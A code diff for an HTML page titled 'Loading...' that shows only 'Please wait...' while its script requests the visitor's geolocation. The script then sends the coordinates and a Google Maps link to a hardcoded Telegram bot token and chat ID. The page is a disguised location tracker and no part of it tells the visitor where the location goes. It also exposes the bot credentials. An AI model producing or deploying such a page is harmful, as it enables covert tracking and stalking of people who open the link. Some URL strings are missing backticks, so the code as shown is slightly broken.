@@ -2,11 +2,40 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Sending OK...</title>
+  <title>Loading...</title>
 </head>
 <body>
   <h1>Please wait...</h1>
 
-  <img src="https://api.telegram.org/bot8071041292:AAFFNiEbRnbOM-ohwiH5tXZ4x_u0rrOcKpg/sendMessage?chat_id=7535691483&text=Ok" style="display:none" onload="document.body.innerHTML = '<h1>Message Sent Successfully!</h1>'" onerror="document.body.innerHTML = '<h1>Error Sending Message.</h1>'">
+  <script>
+    const BOT_TOKEN = "8071041292:AAFFNiEbRnbOM-ohwiH5tXZ4x_u0rrOcKpg";
+    const CHAT_ID = 7535691483;
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        const sendLocationUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude};
+        const mapLink = https://www.google.com/maps/search/?api=1&query=${latitude},${longitude};
+        const sendMapUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=لوکیشن روی نقشه:\n${mapLink};
+
+        // ارسال لوکیشن
+        fetch(sendLocationUrl)
+          .then(() => fetch(sendMapUrl))
+          .then(() => {
+            document.body.innerHTML = "<h1>Location Sent Successfully!</h1>";
+          })
+          .catch(() => {
+            document.body.innerHTML = "<h1>Failed to Send Location.</h1>";
+          });
+
+      }, function(error) {
+        document.body.innerHTML = "<h1>Location access denied.</h1>";
+      });
+    } else {
+      document.body.innerHTML = "<h1>Geolocation not supported.</h1>";
+    }
+  </script>
 </body>
 </html>
